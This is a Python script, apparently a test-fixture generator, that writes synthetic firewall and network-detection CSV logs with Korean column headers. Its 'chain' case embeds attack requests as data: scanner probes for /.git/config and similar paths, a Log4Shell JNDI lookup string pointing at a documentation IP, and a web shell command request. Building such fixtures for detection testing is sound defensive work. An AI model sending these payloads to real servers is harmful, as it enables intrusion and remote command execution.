"""Synthetic same-header examples; no source records are copied."""
from __future__ import annotations

import argparse
import csv
import io
from datetime import datetime, timedelta, timezone

FW_COLUMNS = ["탐지시간", "그룹명", "장비IP", "대응", "출발지IP", "출발지포트", "목적지IP", "목적지포트", "프로토콜", "TCP플래그", "세션시간", "송신바이트", "수신바이트", "총패킷수", "송신패킷수", "수신패킷수"]
NDR_COLUMNS = ["탐지시간", "로그구분", "그룹명", "장비IP", "대응", "출발지IP", "출발지포트", "출발지국가", "목적지IP", "목적지포트", "프로토콜", "세션ID", "송신바이트", "수신바이트", "요청헤더", "호스트명", "응답값", "User-agent", "공격명"]


def _csv(columns, rows):
    stream = io.StringIO(newline="")
    writer = csv.writer(stream, lineterminator="\r\n")
    writer.writerow(columns)
    writer.writerows(rows)
    return stream.getvalue().encode("cp949")


def fw_csv():
    rows = []
    for i in range(12):
        rows.append([f"2026-10-01 10:{i:02d}:00", "가상 관계사", f"192.0.2.{250+i%2}",
                     "차단" if i%3 == 0 else "허용", "192.0.2.10", 50000+i,
                     "익명-대상-A", 443, "TCP", "SYN", 30, 100, 200, 3, 1, 2])
    return _csv(FW_COLUMNS, rows)


def ndr_csv(case="chain"):
    if case not in {"chain", "normal", "label_only", "missing_response"}:
        raise ValueError("unknown synthetic case")
    start = datetime(2026, 10, 1, 10, tzinfo=timezone(timedelta(hours=9)))
    rows = []
    def add(seconds, source, request, status, ua="SAW synthetic browser", label=""):
        i = len(rows)
        rows.append([(start+timedelta(seconds=seconds)).strftime("%Y-%m-%d %H:%M:%S"),
            "HTTP" if request else "경보", "가상 관계사", "192.0.2.250", "탐지", source,
            40000+i, "", "익명-대상-A", 80, "TCP", f"SYNTHETIC-{i}", 100, 200,
            request, "synthetic.example.test", status, ua, label])
    for i in range(40):
        add(i*5, "192.0.2.20", "GET /service/status" + (" HTTP/1.1" if i % 2 == 0 else ""), "200")
    if case in {"chain", "missing_response"}:
        for i, path in enumerate(("/admin/", "/.git/config", "/WEB-INF/web.xml", "/phpinfo.php", "/server-status")):
            add(300+i*2, "198.51.100.50", f"GET {path} HTTP/1.1", "404", "Nikto/2.5.0")
        add(370, "198.51.100.50", "GET /?x=${jndi:ldap://192.0.2.99/a} HTTP/1.1", "404")
        add(410, "198.51.100.50", "GET /upload/shell.php?cmd=whoami HTTP/1.1", "200")
    elif case == "label_only":
        add(300, "198.51.100.50", "", "", label="가상 웹셸 탐지명")
    if case == "missing_response":
        for row in rows:
            row[NDR_COLUMNS.index("응답값")] = ""
    return _csv(NDR_COLUMNS, rows)


def main():
    from pathlib import Path
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("output", type=Path)
    args = parser.parse_args()
    args.output.mkdir(parents=True, exist_ok=False)
    for name, content in (("fw-mixed-devices.csv", fw_csv()), ("ndr-potential-chain.csv", ndr_csv()),
                          ("ndr-normal.csv", ndr_csv("normal")), ("ndr-label-only.csv", ndr_csv("label_only")),
                          ("ndr-missing-response.csv", ndr_csv("missing_response"))):
        (args.output/name).write_bytes(content)


if __name__ == "__main__":
    main()
